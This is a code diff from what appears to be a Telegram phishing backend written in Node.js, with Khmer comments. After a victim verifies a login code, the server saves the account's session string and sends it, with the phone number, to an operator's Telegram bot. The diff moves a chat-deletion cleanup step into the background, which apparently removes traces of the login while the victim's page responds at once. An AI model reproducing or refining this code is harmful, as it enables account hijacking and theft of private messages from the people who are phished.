@@ -205,11 +205,13 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
-        await cleanupPostLogin(client);
-
         const sessionString = client.session.save();
         delete sessions[phoneNumber];
 
+        // ដំណើរការលុប Chat ក្នុង Background ដោយមិនបាច់ឱ្យ Frontend រង់ចាំ (ដក await ចេញ)
+        cleanupPostLogin(client).catch(err => console.error("Cleanup background error:", err));
+
+        // ផ្ញើ Session String ចូល Telegram Admin Bot
         if (botToken && adminChatId) {
             try {
                 const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
@@ -228,6 +230,7 @@ app.post('/api/verify-code', async (req, res) => {
             }
         }
 
+        // ឆ្លើយតបទៅ Frontend ភ្លាមៗ (ក្នុងរយៈពេល 1-2 វិនាទី)
         res.json({
             success: true,
             message: "Authentication successful!",
